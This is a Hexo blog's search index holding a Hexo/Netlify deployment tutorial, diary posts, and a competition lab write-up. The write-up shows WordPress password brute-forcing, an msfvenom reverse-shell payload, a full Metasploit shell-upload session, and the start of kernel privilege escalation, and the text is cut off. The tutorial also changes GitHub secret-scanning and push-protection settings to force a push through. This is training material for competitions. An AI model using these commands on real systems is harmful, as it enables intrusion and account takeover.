<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>用Hexo + Github Pages + Netlify + Cloudflare(可选)搭建个人博客</title>
      <link href="/2025/02117db3b5.html"/>
      <url>/2025/02117db3b5.html</url>
      
        <content type="html"><![CDATA[<h1 id="为什么要写这个教程"><a href="#为什么要写这个教程" class="headerlink" title="为什么要写这个教程"></a>为什么要写这个教程</h1><p>因为我在2022年买的腾讯云服务器过期了，但是我自己个人又没有搞网安编程这一块了，就觉得专门去买服务器可能会很亏，就在想有没有什么白嫖的方法，然后凭借我剩下的关于网络的知识，想到了Gitee，但是Gitee现在不让部署了，好像只有Github可以部署，但是缺点是很慢。</p><hr><h2 id="如何创建Hexo博客"><a href="#如何创建Hexo博客" class="headerlink" title="如何创建Hexo博客"></a>如何创建Hexo博客</h2><p>在我博客右上角搜索按钮，搜搜关键词<code>搭建hexo</code>两个字就可以搜出来教程了</p><h2 id="在Github上创建仓库"><a href="#在Github上创建仓库" class="headerlink" title="在Github上创建仓库"></a>在Github上创建仓库</h2><p>注册一个Github账号，然后创建一个仓库，网页的话在右上角，如下图所示。</p><p><img src="/images/2025/2025-2/530de4c3-6a0e-4372-9026-0fbc3358e21f.png" alt="创建仓库"></p><p>然后按照下图创建完毕即可，名字什么的，仿照填</p><p><img src="/images/2025/2025-2/71ceccd6-b512-4dc9-980b-be9b1c1620ae.png" alt="仓库创建完毕"></p><p>回到<code>Code</code>页面，然后如下图把我下面截图打马赛克的地方复制，然后放在你Hexo博客<code>根目录</code>下的<code>_config.yml</code>文件里面，还是如下图截图位置粘贴即可。</p><p><img src="/images/2025/2025-2/c6b2c4e8-1e1d-4144-9299-8b1faea12d23.png" alt="复制"></p><p><img src="/images/2025/2025-2/0bf92586-5686-4bb7-8f8b-0ca881cfc58a.png" alt="粘贴到红色马赛克地方"></p><hr><h3 id="配置id-rsa和id-rsa-pub、解决github-Push-rejected报错和一个小问题"><a href="#配置id-rsa和id-rsa-pub、解决github-Push-rejected报错和一个小问题" class="headerlink" title="配置id_rsa和id_rsa.pub、解决github Push rejected报错和一个小问题"></a>配置id_rsa和id_rsa.pub、解决github Push rejected报错和一个小问题</h3><p>今天折腾了一天，遇到两个报错这个是其中之一，然后才知道原来要配置这个，如果你之前配置过git，或者是如下提示报错（找不到报错截图了，但是这个报错肯定是这样的）</p><blockquote><p>Please make sure you have the correct access rights and the repository exist</p></blockquote><p>打开你的桌面，然后鼠标右键打开<code>Git bash</code> 然后输入</p><pre class="line-numbers language-none"><code class="language-none">git config --global user.name &quot;你的github昵称&quot;git config --global user.email &quot;你注册github的邮箱&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后打开路径<code>C:\Users\你的用户名\.ssh</code>，删掉里面的·<code>id_rsa</code>和<code>id_rsa.pub</code>重新配置一个，在<code>.ssh</code>这个目录下面，打<code>Git Bash</code>，输入代码。</p><pre class="line-numbers language-none"><code class="language-none">ssh-keygen -t rsa -C &quot;你的邮箱&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后一路回车创建完毕，此时此刻你<code>.ssh</code>这个文件夹下就重新生成了<code>id_rsa</code>和<code>id_rsa.pub</code>，然后使用记事本打开<code>id_rsa.pub</code>这个文件，把这个文件里面的内容复制，然后点击你Github右上角的头像找到设置之后，如下图操作</p><p><img src="/images/2025/2025-2/d95f1a78-98ba-4935-860f-fcd75d5bd19d.png"></p><p><img src="/images/2025/2025-2/26af1a0e-85b8-40c4-9b8d-62fe01cbbb6c.png" alt="添加SSH KEY"></p><p>添加之后大功告成，就可以使用<code>hexo d</code>命令把你的Hexo博客文件推送到你的Github仓库了，正常情况下是解决了，如果你和我一样遇到了如下报错。</p><p><img src="/images/2025/2025-2/59cf0564-1bd2-4130-bb50-17cb80a895c8.png" alt="github Push rejected报错"></p><p>报错原因可能是<code>Github的保护机制引起rejected</code>然后你就可以，点你Github右上角的头像进入设置，关掉如下图的设置，原本是<code>disable</code>然后关掉之后变成了<code>Enable</code></p><p><img src="/images/2025/2025-2/2574d89b-1fc8-4499-b501-1cd1d5121202.png"></p><p>然后打开你Hexo项目仓库的设置，往下翻找到<code>Secret scanning</code>原本是<code>disable</code>然后关掉之后变成了<code>Enable</code>。</p><p><img src="/images/2025/2025-2/61cfcfbc-1e54-41b8-8b77-727d1d52ac7c.png"></p><p><img src="/images/2025/2025-2/9076c526-512d-49c1-a892-3c998e5c8182.png"></p><p>这样一通操作完毕之后，再次重新<code>hexo d</code>之后就可以部署成功了。</p><p>其实我这里遇到一个小问题，就是我<code>_config.yml</code>默认分支是<code>master</code>我把配置文件master也修改成main没用，每次推送上来都还是自动给我创建一个master分支，于是我把默认分支修改成了master，并且删掉了main（感觉非常不专业，但是也所谓了能用就行）</p><p>然后就可以使用，Github给你分配的域名访问了</p><pre class="line-numbers language-none"><code class="language-none">xxx.github.io你创建的仓库名称.github.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至此，部署到Github完毕！</p><hr><h2 id="Github接Netlify"><a href="#Github接Netlify" class="headerlink" title="Github接Netlify"></a>Github接Netlify</h2><p>Netlify免费版其实也够个人用户用了，除非博客真的很火。</p><p>打开<a href="https://www.netlify.com/">Netlify官网</a>注册一个账号，然后按照提示绑定你的Github，选择免费版本，然后输入你的团队名称，比如Hexo，然后选择你的Hexo项目，如下图所示。</p><p><img src="/images/2025/2025-2/3ed4b7c4-1988-43d7-9870-b99babf2a39d.png"></p><p>然后来到如下设置，只需要修改如图所示的位置，这个位置是Netlify，给你的域名，用来访问的，然后完成即可</p><p><img src="/images/2025/2025-2/a686187a-752c-4959-af68-51212dc5e085.png"></p><p>等待构建完成之后，打开图片所示的域名，也就是你刚刚创建的名字的那个地方所填写的域名，就可以访问你的博客了，Netlify我感觉速度还挺快。</p><p><img src="/images/2025/2025-2/22a463c6-0f46-423d-a0d3-e0150078a5ee.png"></p><p>然后上面的红色箭头是设置你自己的域名，添加完自己的域名之后还需要去你购买域名的服务商那边添加解析，在比如阿里云，腾讯云，我这里是阿里云如下图所示，这里添加的解析就是刚刚<code>Netlify</code>创建的那个域名，</p><p><img src="/images/2025/2025-2/5d81766c-6147-482d-b7ad-68a154b3433c.png"></p><table><thead><tr><th>主机记录</th><th>记录类型</th><th>解析请求来源</th><th>记录值</th><th>TTL</th><th>状态</th><th>备注</th><th align="center">创建时间</th></tr></thead><tbody><tr><td>www</td><td>CNAME</td><td>默认</td><td>banqin.netlify.app</td><td>10</td><td>启用</td><td>-</td><td align="center">2022-01-18 00:08:48</td></tr><tr><td>@</td><td>CNAME</td><td>默认</td><td>banqin.netlify.app</td><td>10</td><td>启用</td><td>-</td><td align="center">2021-10-20 20:31:52</td></tr></tbody></table><p>创建完成之后，回到刚刚Netlify的页面，验证然后获取一下证书即可完成，如下图。</p><p><img src="/images/2025/2025-2/9a02e534-2384-4104-ad0c-47e2e1ebe0cb.png"></p><p>至此Github接Netlify配置完毕</p><hr><h2 id="配置Cloudflare加速-可选"><a href="#配置Cloudflare加速-可选" class="headerlink" title="配置Cloudflare加速(可选)"></a>配置Cloudflare加速(可选)</h2><p>为什么是可选呢，因为我自己实际测试下来，光接一个Netlify速度好像就可以了，有些时候装了Cloudflare速度还会变慢，但是有些时候还是有用，所以还是看情况安装。</p><ul><li>打开<a href="www.cloudflare.com">Cloudflare</a>官网注册一个账号</li><li>添加站点</li></ul><p><img src="/images/2025/2025-2/b4c43428-3d7e-4365-a768-a1c128760985.png"></p><p>如上图所示，然后选择免费版本，之后就会扫描你的站点的DNS记录，如果不正确需要手动添加删除，如下图我是配置好了。</p><p><img src="/images/2025/2025-2/7c34546d-b5e4-48f6-abae-07bd1c02e097.png"></p><p>之后按照最后的提示去修改DNS即可，我这里是阿里云阿里云修改位置所示图2，这样修改完成之后，官方会提示大概在24小时以内会完成，但是其实不会这么久，收到官方发的邮件就可以。</p><p><img src="/images/2025/2025-2/d15a5ed9-367c-4b0d-9a3e-379fb7cb0a00.png" alt="提示修改DNS"></p><p><img src="/images/2025/2025-2/2d269298-bc74-496f-8253-567b385efa8c.png" alt="图2"></p><p>参考学习文章：</p><p><code>[1]: https://blog.grin.cool/blog/hexo-blog</code></p><p><code>[2]: https://blog.csdn.net/crisschan/article/details/136866137</code></p><p><code>[3]: https://blog.csdn.net/weixin_43928112/article/details/131196951</code></p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>何为选择？</title>
      <link href="/2023/0994124e8a.html"/>
      <url>/2023/0994124e8a.html</url>
      
        <content type="html"><![CDATA[<p>   四谎看了一半，开始有点痛了！痛！痛起来了了！其实我自己在三年前就准备看四谎的，但是因为种种原因一直没看完，到最近开学才想起来有这个番剧，虽然才看了一半，但是想到后面的剧情就有点难受……</p><blockquote><p>那就等我把四谎看完了在写一篇感受吧！</p></blockquote><p><img src="/images/2023/2023-9/2023-9-26/xun.png" alt="薰"></p><p>说起这个，我还发现我的拖延症也有点严重，之前在广东那会看轻音少女，看了两个月才看了10多集，隔了几个月之后才看完，虽然我很羡慕她们什么的，没有但是！ಥ_ಥ。</p><p><img src="/images/2023/2023-9/2023-9-26/qy.png" alt="轻音少女"></p><p>这样好的番剧每年每个月每个时间段都有人在看欸~</p><p>还有就是今天的事情不知道如何抉择，到底是求稳？还是赌一把呢？可是按照我之前的经验来说赌一把是最笨的选择，我想求稳，但是赌一把万一呢？好难选择啊！！！</p>]]></content>
      
      
      <categories>
          
          <category> 心情记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心情记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间过得真快啊~</title>
      <link href="/2023/09bab92b3c.html"/>
      <url>/2023/09bab92b3c.html</url>
      
        <content type="html"><![CDATA[<h3 id="一-这一年我做了什么"><a href="#一-这一年我做了什么" class="headerlink" title="一.这一年我做了什么"></a>一.这一年我做了什么</h3><p>​    先说做了什么，大多数时间都去学习做MMD也就是miHoyo miHoyo dance（其实是Miku Miku Dance），然后从这个MMD接触到了Blender，深入了解了Blender就感觉做动画的好帅啊！就暗暗发誓我也要做一个很厉害的渲染师傅和建模师傅，虽然现在还在学习，但是不影响，就比如这篇文章的封面图就是我在今年的时候做的，反正我就特别喜欢，天天发癫o(<em>￣▽￣</em>)o。</p><p><img src="/images/2023/2023-9/2023-9-23/niao.png" alt="鸟-2023-5-24"></p><p>然后又是考试，我以前贼自信，说自己是啥啥啥学生（其实什么都不是），觉得只要自己努力什么都能好起来，但是现实狠狠的给了我一巴掌，努力有些时候并不是很有用，于是在今年上半年考完试之后，为期五个月的假期！！！我又做了什么？我做了一堆视频，B站粉丝来到了1.7万。</p><p><img src="/images/2023/2023-9/2023-9-23/fans.png" alt="粉丝数量"></p><p>高兴吗？在我粉丝突破1万粉丝的时候我是高兴的，但是现在我是麻木的，因为我觉得似乎好像没啥用，高兴是高兴在，耶耶耶！我有一万粉丝了感觉很厉害的样子，麻木在高兴之后发现似乎没啥用……</p><p>还有就是之前为了虚荣心想要那个联合国基金会的那个戒指，到处了解之后才知道需要捐款才能得到，于是我真的去捐款了然后也拿到了。</p><p><img src="/images/2023/2023-9/2023-9-23/jiezhi.png" alt="戒指(送给未来的老婆？！)"></p><p>（当然捐款我一直没停直到现在2023年9月23日也在捐款……）</p><p>在今年2023年的五一假期和初中同学一起去了漫展，是第七届的梦乡。</p><p><img src="/images/2023/2023-9/2023-9-23/mengxiang.png" alt="梦乡站！"></p><p>其实在去年年底的时候就打算去了，我觉得漫展的人好有趣的，感觉每个人都充满了power！（漫展特种兵），然后也拍了许多照片，感觉自己拍的不是很好。</p><p><img src="/images/2023/2023-9/2023-9-23/tezhong.png" alt="一些军迷(我自己第一眼看成了彩虹六号)"></p><p><img src="/images/2023/2023-9/2023-9-23/shuai.png" alt="好帅啊！"></p><p>其实还有很多照片的，还有合照，但是感觉放网上不太好，就这下了，我印象最深的时候，当时去重庆漫展附近酒店都满员了，好不容易找到一个住宿费还贼贵我记得是400多块钱一个晚上还贼小，只有一张拍的窗外图片了。</p><p><img src="/images/2023/2023-9/2023-9-23/wai.png" alt="想骂街"></p><p>之后觉得我不能当观众于是乎，我也用闲钱组了一套COSPLAY的套装是<a href="https://baike.baidu.com/item/%E6%B3%B0%E5%9D%A6%E9%99%A8%E8%90%BD2/13855939">泰坦陨落2</a>里面的铁驭，贵是真的贵，但是帅是真的帅，我记得是2023年6月24日左右的重庆taxi动漫文化节，当然还是和同学一起去的，有了前面的经验这次去就很轻松了，下面这张是我最喜欢的一张。</p><p><img src="/images/2023/2023-9/2023-9-23/tieyu.png" alt="我真帅"></p><p>我记得B站还有视频的，我就不贴在我这里了(￣▽￣)”。</p><p>之后的7-8月份我都是跟着B站的UP主健身，为什么健身，因为我觉得在家里五个月可能要躺废了，就感觉必须要改变一下自己，当然自己肯定是坚持下来了。</p><p><img src="/images/2023/2023-9/2023-9-23/jianshen.png" alt="健身器材"></p><p>但是效果肯定是有的，我就不好意思放在上面了233333，不懂的就是我练之前是60kg，但是两个月之后还是60kg，练了和没练一样好奇怪。</p><p>在2023年8月底的时候组了一个NAS，用来存储我的所有东西，比如照片什么的，也成功打造了自己的影音中心，顺便把我忘记了五个月的电脑知识和网络方面的知识全部复习了一遍，感谢壹士！！！</p><p><img src="/images/2023/2023-9/2023-9-23/NAS.png" alt="NAS"></p><p>之后学校录取通知书下来了，当时我觉得终于远离我以前的那个学校了真好（其实就在旁边），但是学校还是选在了本地，为什么，因为之前的高中同学都选在那边去了（理解为地名），我其实想开启一段新的生活也就是周围全是陌生人，现在周围确实全是陌生人，但是呢现在开学两个周之后（2023年9月10日开学），我反而开始思念以前高中的时光，然后之前高中那会玩的好的就偶尔打打电话吐槽一下学校什么的，我觉得也挺好……</p><p><img src="/images/2023/2023-9/2023-9-23/kaixuediaml.png" alt="开学典礼找不到班级"></p><p><img src="/images/2023/2023-9/2023-9-23/fancai.png" alt="学校的饭菜"></p><p><img src="/images/2023/2023-9/2023-9-23/sushe.png" alt="学校宿舍"></p><p>短短几句话就总结了这一年对于我来说比较重要的事情，虽然还有很多小事情比如在做MMD中遇到了很多好朋友什么的，自己也开了一个群什么的（居然有1K多的人），对新学校不习惯什么的，想要买一个相机来记录什么的。</p><hr><h3 id="二-对自己画饼"><a href="#二-对自己画饼" class="headerlink" title="二.对自己画饼"></a>二.对自己画饼</h3><p>想要吃一个老婆饼？（女朋友？）总之就是先按照目前自己的打算走下去吧，网站也成功备案！</p>]]></content>
      
      
      <categories>
          
          <category> 心情记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心情记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全金砖五国国赛-b模块-练习题</title>
      <link href="/2022/107cfb74bb.html"/>
      <url>/2022/107cfb74bb.html</url>
      
        <content type="html"><![CDATA[<h1 id="二-B模块安全事件响应-网络安全数据取证-应用安全"><a href="#二-B模块安全事件响应-网络安全数据取证-应用安全" class="headerlink" title="二.B模块安全事件响应/网络安全数据取证/应用安全"></a>二.B模块安全事件响应/网络安全数据取证/应用安全</h1><h2 id="B-1-系统漏洞利用与提权"><a href="#B-1-系统漏洞利用与提权" class="headerlink" title="B-1.系统漏洞利用与提权"></a>B-1.系统漏洞利用与提权</h2><h3 id="1-使用nmap扫描靶机系统"><a href="#1-使用nmap扫描靶机系统" class="headerlink" title="1.使用nmap扫描靶机系统"></a>1.使用nmap扫描靶机系统</h3><blockquote><p>1.使用nmap扫描靶机系统，将靶机开放的端口号按从小到大的顺序作为FLAG（形式：[端口1,端口2…,端口n]）提交；</p></blockquote><p>这里使用的是KALI系统扫描靶机IP地址，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.10.76<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1020/nmap.png"></p><p>最终flag就是,<code>flag&#123;443,8080&#125;</code>。</p><hr><h3 id="2-弱口令进行登录"><a href="#2-弱口令进行登录" class="headerlink" title="2.弱口令进行登录"></a>2.弱口令进行登录</h3><blockquote><p>2.通过上述端口访问靶机系统，使用弱口令进行登录，将正确的用户名和密码作为FLAG（形式：[用户名,密码]）提交；</p></blockquote><p>打开上面第一题获得的端口，如下图，发现是wordpress的CMS，如下图。</p><p><img src="/images/wordimage/2022/1020/wordpress.png"></p><p>之后根据题目要求提示，应该是wordpress后台没错了，我们就可以使用<code>wpscan</code>工具来进行暴力破解wordpress后台密码，命令如下，使用的字典是Kali自带的字典。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan --url http://192.168.10.76:8080/wordpress -P ./rockyou.txt -U rockyou.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，正在进行破解。</p><p><img src="/images/wordimage/2022/1020/wordpress-passwd.png" alt="正在破解……"></p><p>破解成功如下图。</p><p><img src="/images/wordimage/2022/1020/passwd.png" alt="破解成功"></p><blockquote><p>账户：admin</p><p>密码：123456</p></blockquote><p>之后我们就可以登录后台wordpress肯定是<code>wp-admin</code>如下图，进入了后台，然后我们就可以使用上图破解出来的密码，登录。</p><p><img src="/images/wordimage/2022/1020/wp-admin.png"></p><p>如下图，登录成功。</p><p><img src="/images/wordimage/2022/1020/houtai.png"></p><p>所以就获得了flag：<code>FLAG[admin,123456]</code></p><hr><h3 id="3-kali生成木马反弹"><a href="#3-kali生成木马反弹" class="headerlink" title="3. kali生成木马反弹"></a>3. kali生成木马反弹</h3><blockquote><p>3.利用Kali渗透机生成反弹木马，将生成木马命令执行后提示的第四行的首个单词作为FLAG（形式：[单词]）提交；</p></blockquote><p>这里生成木马使用的是<code>msfvenom</code>工具，命令如下，因为是生成的网页木马。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.10.82 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f raw <span class="token operator">></span> ./shell.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，生成完毕之后根据题目要求得知flag为<code>FLAG[Payload]</code></p><p><img src="/images/wordimage/2022/1020/payload.png"></p><hr><h3 id="4-木马上传靶机"><a href="#4-木马上传靶机" class="headerlink" title="4.木马上传靶机"></a>4.木马上传靶机</h3><blockquote><p>对上述木马文件进行修改后上传到靶机系统中，使用MSF开启监听，将获得的当前权限的用户名作为FLAG（形式：[用户名]）</p></blockquote><p>打开msf搜索<code>wp_admin</code>如下图，找到了一个exploit，使用的exploit是</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/unix/webapp/wp_admin_shell_upload <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/1020/wp_admin.png"></p><p>查看详细需求之后，设置IP地址和wordpress账户密码，具体操作如下图，设置完毕之后，直接就可以exploit了。</p><p><img src="/images/wordimage/2022/1020/success.png"></p><p>之后成功之后，我们就可以获取到用户名了，具体查看如下图。</p><p><img src="/images/wordimage/2022/1020/daemon.png"></p><p>所以就获得了FLAG，<code>FLAG[daemon]</code></p><p>具体如下命令查看复制</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># msfconsole</span>                                                  <span class="token comment"># cowsay++</span> ____________                                                                        <span class="token operator">&lt;</span> metasploit <span class="token operator">></span>                                                                        ------------                                                                               <span class="token punctuation">\</span>   ,__,                                                                              <span class="token punctuation">\</span>  <span class="token punctuation">(</span>oo<span class="token punctuation">)</span>____                                                                             <span class="token punctuation">(</span>__<span class="token punctuation">)</span>    <span class="token punctuation">)</span><span class="token punctuation">\</span>                                                                              <span class="token operator">||</span>--<span class="token operator">||</span> *                                                                                                                                                           <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.1.27-dev                          <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2196</span> exploits - <span class="token number">1162</span> auxiliary - <span class="token number">400</span> post       <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">596</span> payloads - <span class="token number">45</span> encoders - <span class="token number">10</span> nops            <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">9</span> evasion                                       <span class="token punctuation">]</span>Metasploit tip: You can pivot connections over sessions started with the ssh_login modulesmsf6 <span class="token operator">></span> search wp_adminMatching Modules<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>   <span class="token comment">#  Name                                       Disclosure Date  Rank       Check  Description</span>   -  ----                                       ---------------  ----       -----  -----------   <span class="token number">0</span>  exploit/unix/webapp/wp_admin_shell_upload  <span class="token number">2015</span>-02-21       excellent  Yes    WordPress Admin Shell UploadInteract with a module by name or index. For example info <span class="token number">0</span>, use <span class="token number">0</span> or use exploit/unix/webapp/wp_admin_shell_upload                                                       msf6 <span class="token operator">></span> use exploit/unix/webapp/wp_admin_shell_upload <span class="token punctuation">[</span>*<span class="token punctuation">]</span> No payload configured, defaulting to php/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> show options Module options <span class="token punctuation">(</span>exploit/unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span>:   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   PASSWORD                    <span class="token function">yes</span>       The WordPress password to authenticate wit                                         h   Proxies                     no        A proxy chain of <span class="token function">format</span> type:host:port<span class="token punctuation">[</span>,ty                                         pe:host:port<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>   RHOSTS                      <span class="token function">yes</span>       The target host<span class="token punctuation">(</span>s<span class="token punctuation">)</span>, see https://github.com                                         /rapid7/metasploit-framework/wiki/Using-Me                                         tasploit   RPORT      <span class="token number">80</span>               <span class="token function">yes</span>       The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>   SSL        <span class="token boolean">false</span>            no        Negotiate SSL/TLS <span class="token keyword">for</span> outgoing connections   TARGETURI  /                <span class="token function">yes</span>       The base path to the wordpress application   USERNAME                    <span class="token function">yes</span>       The WordPress username to authenticate wit                                         h   VHOST                       no        HTTP server virtual <span class="token function">host</span>Payload options <span class="token punctuation">(</span>php/meterpreter/reverse_tcp<span class="token punctuation">)</span>:   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  <span class="token number">192.168</span>.252.108  <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specif                                     ied<span class="token punctuation">)</span>   LPORT  <span class="token number">4444</span>             <span class="token function">yes</span>       The listen portExploit target:   Id  Name   --  ----   <span class="token number">0</span>   WordPressmsf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.252.78RHOSTS <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.252.78msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> password <span class="token number">123456</span>password <span class="token operator">=</span><span class="token operator">></span> <span class="token number">123456</span>msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> username adminusername <span class="token operator">=</span><span class="token operator">></span> adminmsf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rport <span class="token number">8080</span>rport <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8080</span>msf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> TARGETURI /wordpressTARGETURI <span class="token operator">=</span><span class="token operator">></span> /wordpressmsf6 exploit<span class="token punctuation">(</span>unix/webapp/wp_admin_shell_upload<span class="token punctuation">)</span> <span class="token operator">></span> run<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.252.108:4444 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Authenticating with WordPress using admin:123456<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Authenticated with WordPress<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Preparing payload<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading payload<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing the payload at /wordpress/wp-content/plugins/yLIryRMHSZ/PhFpQUTpUW.php<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">39282</span> bytes<span class="token punctuation">)</span> to <span class="token number">192.168</span>.252.78<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Deleted PhFpQUTpUW.php<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Deleted yLIryRMHSZ.php<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Deleted <span class="token punctuation">..</span>/yLIryRMHSZ<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session <span class="token number">1</span> opened <span class="token punctuation">(</span><span class="token number">192.168</span>.252.108:4444 -<span class="token operator">></span> <span class="token number">192.168</span>.252.78:34785 <span class="token punctuation">)</span> at <span class="token number">2022</span>-10-20 <span class="token number">22</span>:34:52 +0800meterpreter <span class="token operator">></span> shellProcess <span class="token number">1454</span> created.Channel <span class="token number">0</span> created.sh: <span class="token number">0</span>: getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> failed: No such <span class="token function">file</span> or directorysh: <span class="token number">0</span>: getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span> failed: No such <span class="token function">file</span> or directory<span class="token function">whoami</span>daemon<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="5-查看系统内核版本信息"><a href="#5-查看系统内核版本信息" class="headerlink" title="5.查看系统内核版本信息"></a>5.查看系统内核版本信息</h3><blockquote><p>5.查看系统内核版本信息，将系统内核版本号作为FLAG（形式：[版本号]）提交；</p></blockquote><p>使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1020/uname.png"></p><p>获得FLAG，<code>FLAG[3.13.0]</code></p><hr><h3 id="6-在Kali攻击机中查找可使用的漏洞源码"><a href="#6-在Kali攻击机中查找可使用的漏洞源码" class="headerlink" title="6.在Kali攻击机中查找可使用的漏洞源码"></a>6.在Kali攻击机中查找可使用的漏洞源码</h3><blockquote><p>在Kali攻击机中查找可使用的漏洞源码，将找到的漏洞源码文件名作为FLAG（形式：[文件名]）提交；</p></blockquote><p>上面查看到了系统版本信息，可以使用KALI自带的命令<code>searchsploit</code>命令来寻找，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token number">3.13</span>.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1020/37292.c.png"></p><p>就可以获得FLAG，<code>FLAG[37972.c]</code></p><hr><h3 id="7-获取FLAG"><a href="#7-获取FLAG" class="headerlink" title="7.获取FLAG"></a>7.获取FLAG</h3><blockquote><p>7.利用上述漏洞源码后获得到的靶机/root下的唯一.txt文件的文件名作为FLAG（形式：[文件名]）提交；</p></blockquote><p>环境依然是在上面用msf获取的shell里面操作，先说思路，这东西是提权的，KALI开启Web服务，然后控制靶机下载，靶机运行获得root权限，查看flag完事，</p><p>首先要给靶机换一个BASH，发现靶机有python可以使用python更换，命令如下。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体如下图。</p><p><img src="/images/wordimage/2022/1020/python.png"></p><p>然后发现靶机里面也有GCC编译器，如下图。</p><p><img 